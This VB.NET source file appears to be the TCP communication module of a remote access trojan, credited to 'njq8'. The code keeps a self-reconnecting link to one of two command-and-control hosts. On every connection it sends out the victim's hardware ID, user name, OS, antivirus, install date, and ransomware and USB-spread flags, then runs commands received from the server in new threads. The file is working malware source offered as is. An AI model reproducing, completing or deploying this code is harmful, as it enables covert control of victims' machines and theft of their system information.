﻿Public Class TCP
    'credit to njq8
    Public Shared SPL As String = "|'N'|"
    Public Shared KEY As String = "|'L'|"
    Public Shared C As Net.Sockets.TcpClient
    Public Shared MainHOST As String = Settings.HOST1

    Public Shared Sub CON()
        Dim t As New Threading.Thread(AddressOf RC)
        t.Start()
    End Sub

    Public Shared Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(SPL), 0, SPL.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Shared Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Public Shared CN As Boolean = False
    Public Shared Sub RC()
        Dim M As New IO.MemoryStream ' create memory stream
        Dim lp As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CN = False Then GoTo e
            lp += 1
            If lp > 500 Then
                lp = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                M.Write(B, 0, B.Length)
rr:
                If BS(M.ToArray).Contains(SPL) Then ' split packet..
                    Dim A As Array = fx(M.ToArray, SPL)
                    Dim T As New Threading.Thread(AddressOf Commands.Data)
                    T.Start(A(0))
                    M.Dispose()
                    M = New IO.MemoryStream
                    If A.Length = 2 Then
                        M.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CN = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            M.Dispose()
        Catch ex As Exception
        End Try
        M = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            lp = 0
            C.Client.Connect(MainHOST, Settings.PORT)
            CN = True
            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.2A" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
        Catch ex As Exception
            If MainHOST = Settings.HOST1 Then
                MainHOST = Settings.HOST2
            Else
                MainHOST = Settings.HOST1
            End If
            Threading.Thread.CurrentThread.Sleep(2500)
            GoTo e
        End Try
        GoTo re
    End Sub
End Class